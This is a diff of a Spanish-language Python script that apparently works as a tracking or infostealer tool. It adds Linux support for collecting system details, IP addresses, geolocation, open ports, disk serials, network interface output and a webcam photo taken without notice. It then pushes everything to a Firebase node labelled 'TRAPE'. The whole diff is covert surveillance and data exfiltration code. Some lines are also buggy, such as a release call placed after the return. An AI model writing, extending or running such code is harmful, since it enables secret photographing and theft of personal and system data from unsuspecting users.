@@ -28,6 +28,12 @@ def getEspacioEnDisco():
     "Espacio_usado":str(to_gb(disk_usage.used)),"Porcentaje de espacio usado": str(disk_usage.percent)}
     return Datos
 
+def getEspacioEnDiscoL():
+    disk_usage = psutil.disk_usage('/')
+    Datos = {"Espacio_total" : str(to_gb(disk_usage.total)),"Espacio_libre": str(to_gb(disk_usage.free)),
+    "Espacio_usado":str(to_gb(disk_usage.used)),"Porcentaje de espacio usado": str(disk_usage.percent)}
+    return Datos
+
 def getPuertosOpen():
     IP = '127.0.0.1'
     Start = int(7999)
@@ -54,6 +60,13 @@ def getSerialDisk():
         break;
     return s
 
+def getSerialDiskL():
+    #c = os.popen('lsblk --nodeps -o name,model,serial')
+    s = {
+	'serial':os.popen('lsblk --nodeps -o serial')
+    }
+    return s
+
 def getSerialUUID():
     #print uuid.UUID(int=uuid.getnode())
     s = uuid.uuid1()
@@ -76,6 +89,12 @@ def getInterfacesRed():
     ARed.append(Red)
     return Red
 
+def getInterfacesRedL():
+    ARed = []
+    Red = os.popen('ifconfig -a').read()
+    ARed.append(Red)
+    return Red
+
 def getUbicacionIP():
     pagina = urllib.urlopen('https://es.geoipview.com/').read()
     la = re.search('([L])+([a])+([t])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([0-9])+([.])+([0-9])\w+|([L])+([a])+([t])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([-][0-9]{0,})+([.])+([0-9])\w+', pagina)
@@ -90,6 +109,20 @@ def getUbicacionIP():
     return gps
 
 def getFoto():
+    cap = cv2.VideoCapture(0)
+    leido, frame = cap.read()
+    if leido == True:
+        cv2.imwrite("foto.png", frame)
+        print("Foto tomada correctamente")
+        image = open('foto.png', 'rb') #open binary file in read mode
+        image_read = image.read()
+        image_64_encode = base64.encodestring(image_read)
+    else:
+        print("Error al acceder a la camara")
+    return image_64_encode
+    cap.release()
+
+def getFotoL():
     cap = cv2.VideoCapture(0)
     leido, frame = cap.read()
     if leido == True:
@@ -131,11 +164,41 @@ if str(platform_data[0]) == "Windows":
     DInfoplaca = (PB)
     print ('-------Obteniendo Informacion de las Interfaces de Red------')
     IR = getInterfacesRed()
-    DInfored = (IR)
+    msj = ('Informacion de las Interfaces de Red')
+    DInfored = msj
 else:
-    print ('linux')
-
-DUniversal = ({'Sistema':DSistema,'Red':DRed,'Disk':DDisk,'Puertos':DPuertos,'Ubicacion':DUbicacion,'Foto':DFoto,'DInfoplaca':DInfoplaca})
+    print('-------Obteniendo Datos Del Sistema------')
+    DSistema = ({'Sistema Operativo': str(platform_data[0]),'Nombre De Usuario':str(platform.node()),'Arquitectura': str(platform.machine()),'Version': str(platform.version()),'Procesador:': str(platform.processor())})
+    print (DSistema)
+    ifr = ('-------Obteniendo Datos de Red------')
+    DRed = ({'Nombre de Usuario En Red ': str(platform.node()),'Ip Local': str(getMiIpLocal(platform.node())),'Ip Publica': str(getmiIpPublica())})
+    print (DRed)
+    ifd = ('-------Obteniendo Informacion de discos------')
+    DDisk = (getEspacioEnDiscoL())
+    print (DDisk)
+    print ('Scaneando Puertos....')
+    pu= getPuertosOpen()
+    DPuertos = (pu)
+    print ('------- Obteniendo Ubicacion------')
+    msjU = getUbicacionIP()
+    DUbicacion = (msjU)
+    print ('-------Obteniendo Foto------')
+    f = getFotoL()
+    DFoto = (f)
+    print ('-------Obteniendo N serial Disco------')
+    s = getSerialDiskL()
+    DNSDisk = (str(s))
+    print ('-------Obteniendo N serial UUID------')
+    U = getSerialUUID()
+    DNSUUID = (str(U))
+    print ('------- Obteniendo Informacion de la placa base------')
+    PB = getSerialPlaca()
+    DInfoplaca = (PB)
+    print ('-------Obteniendo Informacion de las Interfaces de Red------')
+    IR = getInterfacesRedL()
+    DInfored = (IR)
+    
+DUniversal = ({'Sistema':DSistema,'Red':DRed,'Disk':DDisk,'Puertos':DPuertos,'Ubicacion':DUbicacion,'Foto':DFoto,'DInfoplaca':DInfoplaca,'DInfored':DInfored,'DNSDisk':DNSDisk,'DNSUUID':DNSUUID,'DInfoplaca':DInfoplaca})
 
 #enviar datos a firebase
 db.child("TRAPE").push(DUniversal)
